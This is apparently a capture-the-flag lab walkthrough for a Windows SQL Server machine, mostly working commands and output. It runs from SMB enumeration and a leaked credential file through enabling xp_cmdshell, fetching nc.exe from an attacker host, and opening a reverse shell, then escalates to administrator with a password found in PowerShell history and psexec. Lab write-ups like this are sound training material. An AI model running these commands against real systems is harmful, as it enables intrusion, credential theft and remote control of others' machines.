# ENUMERATION

NMAP
```shell
└─$ sudo nmap -sC -sV 10.129.55.134 -oG nmap.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 19:53 CEST
Nmap scan report for 10.129.55.134
Host is up (0.032s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
|_ssl-date: 2022-08-16T17:53:19+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-08-16T17:33:12
|_Not valid after:  2052-08-16T17:33:12
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-16T17:53:11
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-08-16T10:53:12-07:00
| ms-sql-info: 
|   10.129.55.134:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.94 seconds
```

LIST SMB SHARES:
```shell
└─$ smbclient -N -L 10.129.55.134                          

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.55.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Connect to backup share and get interesting file:
```share
└─$ smbclient -N \\\\10.129.55.134\\backups                 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

		5056511 blocks of size 4096. 2613093 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
smb: \> exit
````

prod.dtsConfig file seems has mssql credential information:
```shell
└─$ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>   
```

Connect to mssql ussing impacket
[mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

```shell
└─$  python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.55.134 -windows-auth                                                                         
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> SELECT is_srvrolemember('sysadmin');
              

-----------   

          1   

SQL> EXEC xp_cmdshell 'net user';
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL> sp_configure 'show advanced options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> sp_configure;

xp_cmdshell                                     0             1              0             0   

SQL> EXEC sp_configure 'xp_cmdshell', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL                                                                               

SQL> 
```

Download nc.exe from [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------)
Or search package for your distro (kali)[https://www.kali.org/tools/windows-binaries/]

#Reverse shell
On local machine:
Open python http server on nc.exe directory:
```shell
└─$ locate nc.exe
/home/darthv/git/SecLists/Web-Shells/FuzzDB/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe

└─$ cd /usr/share/windows-resources/binaries/nc.exe 
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Start netcat listen:
```shell
└─$ sudo nc -lvnp 443
[sudo] password for darthv: 
Listening on 0.0.0.0 443
```

On windows server side:
Try execute pwd command with powershell -c:
```shell
SQL> xp_cmdshell "powershell -c pwd"
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

Path                                                                               

----                                                                               

C:\Windows\system32                                                                

NULL                                                                               

NULL                                                                               

NULL                                                                               

SQL> 
```

Change direcotry and try powershell wget alias to get nc.exe
```shell
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.234/nc.exe -outfile nc.exe"
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

SQL> 
```

Now bind cmd.exe to our nc listener:
```shell
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.14.234 443"
```

YESSSS our local nc session, get the uer flag:
```shell
└─$ sudo nc -lvnp 443
[sudo] password for darthv: 
Listening on 0.0.0.0 443
Connection received on 10.129.55.134 49676
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\sql_svc\Downloads>whoami
whoami
archetype\sql_svc

C:\Users\sql_svc\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Downloads

08/16/2022  11:31 AM    <DIR>          .
08/16/2022  11:31 AM    <DIR>          ..
08/16/2022  11:31 AM            59,392 nc.exe
               1 File(s)         59,392 bytes
               2 Dir(s)  10,710,880,256 bytes free

C:\Users\sql_svc\Downloads>cd ..\Desktop
cd ..\Desktop

C:\Users\sql_svc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,710,814,720 bytes free

C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3
C:\Users\sql_svc\Desktop>

```

# Privilege Escalation
We are going to use a tool called winPEAS , which can automate a big part of the enumeration process in the target system. You can download from here:
[winPEAS](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)

Run again python httpd module on winPEAS directory:
```shell
└─$ ls -lrt
total 1888
-rw-r--r-- 1 darthv darthv 1930752 Jan 16  2022 winPEASx64.exe
                                                                                                            
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Get winPEAS on mssql server:
```shell
C:\Users\sql_svc\Downloads>powershell wget http://10.10.14.234/winPEASx64.exe -outfile winPEASx64.exe
powershell wget http://10.10.14.234/winPEASx64.exe -outfile winPEASx64.exe

C:\Users\sql_svc\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Downloads

08/16/2022  11:49 AM    <DIR>          .
08/16/2022  11:49 AM    <DIR>          ..
08/16/2022  11:31 AM            59,392 nc.exe
08/16/2022  11:49 AM         1,930,752 winPEASx64.exe
               2 File(s)      1,990,144 bytes
               2 Dir(s)  10,708,750,336 bytes free

C:\Users\sql_svc\Downloads>
```

Execute winPEAS on mssql server:
```shell
C:\Users\sql_svc\Downloads>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\sql_svc\Downloads>.\winPEAS64.exe
...
...
...
ÉÍÍÍÍÍÍÍÍÍ͹ Analyzing Windows Files Files (limit 70)
    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    C:\Users\Default\NTUSER.DAT
    C:\Users\sql_svc\NTUSER.DAT
```

From the output we can observer that we have SeImpersonatePrivilege (more information can be found [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), wich is also vulnerable to [juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato) 
However, we can first check the two existing files where credential could be possible to be found.

Check consoleHost_history.txt file and get credentials:
```shell
PS C:\Users\sql_svc\Downloads> cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> dir
dir


    Directory: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        3/17/2020   2:36 AM             79 ConsoleHost_history.txt                                               


PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> 
```

We can now use the tool psexec.py again from the Impacket suite to get a shell as the administrator:
```shell
└─$ /usr/bin/impacket-psexec administrator@10.129.55.134
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.55.134.....
[*] Found writable share ADMIN$
[*] Uploading file dJsQKqeR.exe
[*] Opening SVCManager on 10.129.55.134.....
[*] Creating service KSgs on 10.129.55.134.....
[*] Starting service KSgs.....
[!] Press help for extra shell commands                                                                    Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop                                                     
C:\Users\Administrator\Desktop> dir                                                                         Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\Administrator\Desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,707,234,816 bytes free

C:\Users\Administrator\Desktop> type root.txt                                                              b91ccec3305e98240082d4474b848528
C:\Users\Administrator\Desktop> 
```

